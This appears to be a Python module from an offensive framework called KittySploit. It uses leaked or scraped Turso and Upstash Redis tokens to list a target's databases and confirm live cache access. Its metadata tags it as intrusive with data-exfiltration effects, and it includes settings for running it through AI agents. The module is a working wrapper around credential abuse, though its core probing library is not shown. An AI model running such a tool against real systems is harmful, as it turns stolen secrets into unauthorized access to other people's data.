#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Enumerate Turso databases and Upstash Redis REST using leaked tokens.

Follow-up for scanner/http/vibe_stack_secrets_detect.
"""

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.scanner.http.turso_upstash_probe import enumerate_turso_upstash
from lib.scanner.http.vibe_secrets_probe import collect_vibe_http_bodies, mask_secret


class Module(Auxiliary, Http_client):
    __info__ = {
        "name": "Turso / Upstash API Enumeration",
        "description": (
            "Uses leaked Turso API tokens to list databases and Upstash Redis REST "
            "URL/token pairs to verify live cache access."
        ),
        "author": ["KittySploit Team"],
        "tags": ["turso", "upstash", "libsql", "redis", "serverless", "enumeration", "auxiliary"],
        "modules": ["scanner/http/vibe_stack_secrets_detect"],
        "agent": {
            "risk": "intrusive",
            "effects": ["network_probe", "data_exfiltration"],
            "expected_requests": 4,
            "reversible": True,
            "approval_required": True,
            "produces": ["credentials", "risk_signals"],
            "cost": 1.0,
            "noise": 0.35,
            "value": 1.2,
        },
    }

    turso_auth_token = OptString("", "Turso platform API token", False)
    upstash_redis_url = OptString("", "Upstash Redis REST URL", False)
    upstash_token = OptString("", "Upstash REST / QStash token", False)
    auto_discover = OptBool(True, "Scrape SPA for Turso/Upstash credentials", False)

    def run(self):
        bodies = collect_vibe_http_bodies(self.http_request) if self._to_bool(self.auto_discover) else []
        homepage = next((t for p, t in bodies if p == "/"), "")
        if not homepage and bodies:
            homepage = bodies[0][1]

        self._configure_session()
        verify = self._to_bool(self.verify_ssl)

        findings, creds = enumerate_turso_upstash(
            self.session,
            homepage,
            verify_ssl=verify,
            turso_token=str(self.turso_auth_token or "").strip(),
            upstash_url=str(self.upstash_redis_url or "").strip(),
            upstash_token=str(self.upstash_token or "").strip(),
        )

        ok = [f for f in findings if f.get("ok")]
        if not ok:
            print_error("No Turso/Upstash API access (set options or enable auto_discover)")
            return False

        for hit in ok:
            plat = hit.get("platform")
            if plat == "turso":
                print_success(f"Turso: {hit.get('count', 0)} database(s) — {hit.get('databases', [])[:5]}")
            elif plat == "upstash":
                print_success(f"Upstash Redis REST reachable @ {hit.get('endpoint', '?')}")

        self.set_info(
            severity="critical",
            reason=f"Serverless DB/cache enum: {', '.join(sorted({str(h.get('platform')) for h in ok}))}",
            findings=findings,
            credentials={k: mask_secret(v) if "token" in k else v for k, v in creds.items()},
        )
        return True
